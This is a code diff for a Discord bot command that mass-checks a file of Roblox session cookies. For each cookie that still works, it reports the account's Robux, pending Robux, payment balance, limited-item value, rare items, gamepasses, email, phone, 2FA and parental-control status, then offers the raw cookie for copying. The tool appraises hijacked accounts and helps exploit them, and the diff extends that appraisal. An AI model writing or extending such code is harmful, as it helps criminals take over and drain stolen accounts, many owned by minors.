@@ -1,10 +1,5 @@
 import {
   SlashCommandBuilder,
-  PermissionFlagsBits,
-  ActionRowBuilder,
-  ButtonBuilder,
-  ButtonStyle,
-  EmbedBuilder,
   type ChatInputCommandInteraction,
   type MessageComponentInteraction,
   MessageFlags,
@@ -17,7 +12,7 @@ import {
   buildInvalidCookieEmbed,
   buildIpLimitEmbed,
   buildProgressEmbed,
-  buildBaseEmbed,
+  buildAccountEmbed,
 } from '../../lib/embed-helpers';
 import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
 import { logger } from '../../lib/logger';
@@ -44,13 +39,18 @@ function extractCookies(text: string): string[] {
   return result;
 }
 
+const GAMES = [
+  { name: 'Blox Fruits', universeId: 994732206 },
+  { name: 'Adopt Me', universeId: 383310974 },
+  { name: 'Steal a Brainrot', universeId: 7709344486 },
+  { name: 'Rivals', universeId: 6035872082 },
+];
+
 const data = new SlashCommandBuilder()
   .setName('check')
   .setDescription('Mass Checking File')
   .addAttachmentOption((opt) =>
-    opt.setName('file')
-      .setDescription('A .txt file containing cookies')
-      .setRequired(true),
+    opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
   ) as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
@@ -59,8 +59,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
     const attachment = interaction.options.getAttachment('file', true);
     if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
-      const embed = buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.');
-      await interaction.editReply({ embeds: [embed] });
+      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
       return;
     }
 
@@ -69,74 +68,110 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
       fileContent = resp.data;
     } catch (err: any) {
-      logger.error({ err }, 'File download failed in check');
-      const embed = buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file. Please try again.');
-      await interaction.editReply({ embeds: [embed] });
+      logger.error({ err }, 'File download failed');
+      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
       return;
     }
 
     const cookies = extractCookies(fileContent);
     if (cookies.length === 0) {
-      const embed = buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain `_|WARNING...|_CAEQ…` or bare `CAEQ…` tokens.');
-      await interaction.editReply({ embeds: [embed] });
+      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain cookie tokens.')] });
       return;
     }
 
-    const progressEmbed = buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`);
-    await interaction.editReply({ embeds: [progressEmbed] });
+    await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });
 
     let validCount = 0;
     let totalRobux = 0;
+    let totalPending = 0;
 
     for (const rawCookie of cookies) {
       const validation = await Roblox.validateCookie(rawCookie);
       if (!validation.valid) continue;
 
       validCount++;
-      const userId = validation.userId!;
-      const age = await Roblox.getUserAge(userId);
-      const robux = await Roblox.fetchRobux(rawCookie, String(userId));
-      const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
-      const country = await Roblox.fetchCountry(rawCookie);
-      const email = await Roblox.fetchEmailInfo(rawCookie);
-      const parental = await Roblox.fetchParentalControls(rawCookie);
-      const thumb = await Roblox.fetchAvatarThumbnail(String(userId));
-      const credit = await Roblox.fetchCreditBalance(rawCookie);
-      const twoStep = await Roblox.fetchTwoStepConfig(rawCookie, String(userId));
-      const phone = await Roblox.fetchPhoneInfo(rawCookie);
-      const rap = await Roblox.fetchRolimonsRAP(String(userId));
+      const userId = String(validation.userId!);
+      const username = validation.username!;
+      const displayName = validation.displayName || null;
+
+      const [
+        ageData, ageGroup,
+        robux, summary, country, email, parental, thumb,
+        credit, twoStep, phone, rap,
+        pendingRobux, ownedRares,
+      ] = await Promise.all([
+        Roblox.getUserAge(validation.userId!),
+        Roblox.fetchAgeGroup(rawCookie),
+        Roblox.fetchRobux(rawCookie, userId),
+        Roblox.fetchTransactionTotals(rawCookie, userId),
+        Roblox.fetchCountry(rawCookie),
+        Roblox.fetchEmailInfo(rawCookie),
+        Roblox.fetchParentalControls(rawCookie),
+        Roblox.fetchAvatarThumbnail(userId),
+        Roblox.fetchCreditBalance(rawCookie),
+        Roblox.fetchTwoStepConfig(rawCookie, userId),
+        Roblox.fetchPhoneInfo(rawCookie),
+        Roblox.fetchRolimonsRAP(userId),
+        Roblox.fetchPendingRobux(rawCookie, userId),
+        Roblox.getOwnedRareItems(rawCookie, userId),
+      ]);
+
       totalRobux += robux;
+      totalPending += pendingRobux;
 
-      let emailStatus = 'No email';
-      if (email.verified) emailStatus = '✅ Verified';
-      else if (email.pending) emailStatus = '⏳ Pending';
+      const ageString = `Created ${ageData.createdYear} (${ageData.days}D) - ${ageGroup}`;
 
-      const twoStepStatus = `📧 ${twoStep.email ? '✅' : '❌'} Email 2FA | 🔐 ${twoStep.authenticator ? '✅' : '❌'} Authenticator`;
-      const phoneStatus = phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone';
-      const balance = `${credit.balance} ${credit.currency}`;
+      const twoStepStatus = `\`\`\`📧 Email 2FA ${twoStep.email ? '✅' : '❌'} | 🔐 Authenticator ${twoStep.authenticator ? '✅' : '❌'}\`\`\``;
+      const phoneStatus = `\`\`\`${phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone'}\`\`\``;
+      const balance = `\`\`\`${credit.balance} ${credit.currency}\`\`\``;
+      const rapValue = `\`\`\`${rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE'}\`\`\``;
+      const premiumValue = `\`\`\`${rap.premium ? '✅ Yes' : '❌ No'}\`\`\``;
+      const pendingValue = `\`\`\`${pendingRobux.toLocaleString()}\`\`\``;
 
-      const id = Math.random().toString(36).slice(2, 10);
-      const row = buildCopyButtons(id, 'check', rawCookie, false);
+      let emailStatus = 'No email found';
+      if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
+      else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
+
+      const rareText = ownedRares.length ? `\`\`\`${ownedRares.join(', ')}\`\`\`` : '`None`';
+
+      const gamepassLines: string[] = [];
+      for (const game of GAMES) {
+        try {
+          const passes = await Roblox.getGamepasses(game.universeId);
+          for (const gp of passes) {
+            const owns = await Roblox.checkOwnsGamepass(rawCookie, userId, gp.id);
+            if (owns) gamepassLines.push(`✅ ${game.name}: ${gp.name}`);
+          }
+        } catch {}
+      }
+      const gpText = gamepassLines.length ? `\`\`\`${gamepassLines.join('\n')}\`\`\`` : '`None`';
 
       const embed = buildAccountEmbed(
-        validation.username!,
-        validation.displayName || null,
-        userId,
-        age,
+        username,
+        displayName,
+        validation.userId!,
+        ageString,
         robux,
         summary,
         country,
         emailStatus,
-        parental.hasParent ? '✅ Linked' : '❌ None',
+        parental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
         thumb
-      )
-      .addFields(
-        { name: '💰 Balance', value: balance, inline: true },
+      );
+
+      embed.addFields(
+        { name: '💳 Balance', value: balance, inline: true },
         { name: '📞 Phone', value: phoneStatus, inline: true },
         { name: '🔐 2FA', value: twoStepStatus, inline: false },
-        { name: '📈 RAP', value: rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE', inline: true },
-        { name: '⭐ Premium', value: rap.premium ? '✅ Yes' : '❌ No', inline: true }
+        { name: '📈 RAP', value: rapValue, inline: true },
+        { name: '⭐ Premium', value: premiumValue, inline: true },
+        { name: '⏳ Pending Robux', value: pendingValue, inline: true },
+        { name: '🎒 Rare Items', value: rareText, inline: false },
+        { name: '🎮 Gamepasses', value: gpText, inline: false }
       );
+
+      const id = Math.random().toString(36).slice(2, 10);
+      const row = buildCopyButtons(id, 'check', rawCookie, false);
 
       await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
     }
@@ -144,7 +179,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     const summaryEmbed = buildSuccessEmbed(
       validCount === 0
         ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
-        : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}`
+        : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}`
     );
     await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
   } catch (err: any) {
